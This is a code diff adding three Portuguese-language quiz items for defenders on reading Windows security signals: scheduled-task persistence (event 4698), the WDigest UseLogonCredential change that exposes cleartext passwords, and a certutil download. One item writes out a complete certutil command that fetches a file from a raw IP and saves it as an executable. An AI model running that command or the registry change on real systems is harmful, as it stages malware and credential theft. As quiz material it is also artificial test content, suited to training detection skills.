@@ -1534,5 +1534,41 @@ window.QUIZ_BANK = [
     "correct": 0,
     "explanation": "No AS-REP roasting o atacante pede um TGT para contas que não precisam de pré-autenticação Kerberos; o KDC responde com dados cifrados com a chave do utilizador, que depois são quebrados offline. O DC regista o 4768 com Pre-Authentication Type 0. Encontra essas contas com PowerShell (DoesNotRequirePreAuth) e desliga a opção. O 4769 com 0x17 aponta para Kerberoasting, e o ataque não precisa de RDP nem de adivinhar passwords online.",
     "difficulty": "Médio"
+  },
+  {
+    "question": "Numa workstation encontras o evento 4698 às 03:12, criado por uma conta de utilizador que nunca entra à noite. O novo item corre o powershell.exe com um comando codificado de 15 em 15 minutos. O que é que isto mostra, muito provavelmente?",
+    "options": [
+      "Uma verificação normal do Windows Update, porque o Windows agenda as pesquisas de atualizações com PowerShell codificado à noite",
+      "Uma tentativa de logon falhada, porque o 4698 regista uma password errada e o comando codificado é o hash do que foi escrito",
+      "A mudança da password de um utilizador, porque o 4698 é escrito quando corre uma reposição e mostra o script que a alterou",
+      "Persistência através de uma nova tarefa agendada, já que o 4698 indica a criação de uma; revê o XML no evento e remove-a"
+    ],
+    "correct": 3,
+    "explanation": "O evento 4698 é registado quando uma tarefa agendada é criada (com a auditoria Other Object Access Events ligada) e inclui o XML da tarefa com a ação que corre. Uma tarefa criada de noite por uma conta invulgar que lança PowerShell codificado de poucos em poucos minutos é uma técnica clássica de persistência. As tarefas do Windows Update são tarefas de sistema assinadas, os logons falhados são o 4625 e as reposições de password o 4724.",
+    "difficulty": "Médio"
+  },
+  {
+    "question": "O EDR alerta que HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential foi posto a 1 num servidor Windows 10. Porque é que isto é um sinal de alarme sério?",
+    "options": [
+      "Ativa o NTLMv2 no servidor, que já é o padrão, por isso o alerta é um falso positivo deixado por uma baseline de segurança antiga",
+      "Desliga a proteção em tempo real do Windows Defender, para o malware poder ser copiado para o servidor sem ser analisado",
+      "Faz o LSASS guardar outra vez as passwords em texto claro após o próximo logon, e um credential dumper consegue lê-las",
+      "Obriga todos os utilizadores a mudar a password no próximo logon, o que os atacantes usam para trancar os administradores fora"
+    ],
+    "correct": 2,
+    "explanation": "Desde o Windows 8.1 e o Server 2012 R2, o WDigest deixou de guardar credenciais em texto claro no LSASS. Pôr o UseLogonCredential a 1 volta a ligar isso, por isso, depois de os utilizadores entrarem outra vez, uma ferramenta como o Mimikatz consegue extrair as passwords em texto claro. Os atacantes alteram-no para preparar o roubo de credenciais. Alerta para a mudança, repõe o 0 e procura acessos ao LSASS. Não tem nada a ver com o NTLMv2, o Defender ou mudanças forçadas de password.",
+    "difficulty": "Difícil"
+  },
+  {
+    "question": "Os registos de processos de um PC mostram: certutil.exe -urlcache -split -f http://203.0.113.50/a.txt C:\\Users\\Public\\a.exe. Ninguém da equipa de IT gere certificados nesse PC. Como deves interpretar isto?",
+    "options": [
+      "Uma verificação normal de revogação de certificados, porque o certutil descarrega CRLs por HTTP e grava-as como .exe em Public",
+      "Uma ferramenta do Windows usada para descarregar um ficheiro da internet, um truque living-off-the-land; isola e analisa o a.exe",
+      "Uma reparação do Windows Update, porque o certutil vai buscar ficheiros de sistema novos e guarda-os na pasta Public para instalar",
+      "Uma limpeza de cache inofensiva, porque o -urlcache apaga downloads antigos e o -split -f só divide o registo em partes mais pequenas"
+    ],
+    "correct": 1,
+    "explanation": "O certutil é um binário assinado do Windows para certificados, mas '-urlcache -split -f <url> <ficheiro>' põe-no a descarregar qualquer ficheiro. Os atacantes usam-no para trazer payloads sem precisarem de um downloader próprio, por isso é um LOLBin bem conhecido. Um .txt vindo de um IP direto e gravado como .exe em C:\\Users\\Public é um forte sinal de preparação de malware: isola o host, recolhe o ficheiro e verifica o hash. As verificações de CRL não gravam executáveis e o Windows Update não usa o certutil.",
+    "difficulty": "Médio"
   }
 ];
